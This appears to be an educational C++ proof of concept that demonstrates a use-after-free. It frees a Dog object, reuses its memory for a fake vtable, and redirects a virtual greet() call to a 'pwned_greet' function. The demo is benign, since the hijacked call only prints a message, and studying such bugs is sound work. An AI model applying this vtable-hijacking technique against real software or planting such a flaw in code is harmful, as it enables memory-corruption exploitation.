#include <iostream>

class Animal
{
    public:
        virtual ~Animal()
        {
            std::cout << "Destructor of Animal called" << std::endl;
        }

        virtual void greet()
        {
            std::cout << "Hello, I'm an animal" << std::endl;
        }
};

class Dog : Animal
{
    public:
        virtual ~Dog()
        {
            std::cout << "Destructor of Dog called" << std::endl;
        }

        virtual void greet()
        {
            std::cout << "Hello, I'm a dog" << std::endl;
        }
};

void pwned_greet(Dog *p_this)
{
    printf("Method Dog::greet() of object at %p has been replaced\n", p_this);
}

int main()
{
    // allocate Dog object and free it after first use
    Dog *p_real_dog = new Dog();
    printf("Real Dog object at %p\n", p_real_dog);
    p_real_dog->greet();
    delete p_real_dog;

    // allocate pointer which has the same size as a Dog object (only consists of a pointer to the virtual table),
    // memory of the Dog object will be re-used
    void **pp_fake_dog = new(void *);
    printf("Fake Dog object at %p\n", pp_fake_dog);

    // construct virtual table with pwned_greet() as a replacement for Dog::greet() and replace original table
    // see https://shaharmike.com/cpp/vtable-part1/ and https://www.martinkysel.com/demystifying-virtual-tables-in-c-part-3-virtual-tables/ for details
    void *fake_vtable[3];
    fake_vtable[2] = (void *) pwned_greet;
    *pp_fake_dog = fake_vtable;

    // trigger UAF condition
    p_real_dog->greet();
    return 0;
}